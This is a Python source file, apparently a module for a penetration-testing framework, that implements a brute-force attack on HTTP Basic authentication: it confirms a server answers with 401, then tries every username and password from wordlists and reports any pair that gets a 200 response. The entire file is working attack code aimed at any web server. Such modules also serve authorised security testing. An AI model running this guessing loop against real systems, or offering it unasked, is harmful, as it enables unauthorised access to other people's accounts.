from lib.interfaces.iexploit import IExploit
from modules.auxiliary.io import getContentFromFile
import requests
import base64


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="Bruteforece attack auth basic web",
            category="bf",
            authors={
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "All"
            ],
            date="11/04/2016",
            cwe="255",
            description="This a generic exploit for attack auth basic (port 80). Test with credentials by default.",
        )

    def default(self):
        data = {"port": "80",
                "users": "users.txt",
                "passwords": "passwords.txt"}

        return data

    def run(self, data):
        port = data["port"]
        users = getContentFromFile(data["users"])
        passwords = getContentFromFile(data["passwords"])
        url = "http://{0}:{1}".format(self.getIP(), port)
        response = requests.get(url)
        message = ""

        if response is not None:
            if response.status_code != 401:
                message = "{} is not protected by basic auth".format(self.getIP())
                return message

        for user in users:
            for password in passwords:
                data = "{0}:{1}".format(user, password.strip())
                base64Data = base64.encodestring(data).split()[0]
                header = {'Authorization': "Basic {}".format(base64Data)}
                try:
                    response = requests.get(url, headers=header)
                    if response.status_code == 200:
                        message += "Credentials found\nUsername: {0} Password: {1}\n".format(user, password)

                except requests.ConnectionError:
                    return None

        if message == "":
            message = "Sorry. Credentials not found"

        return message
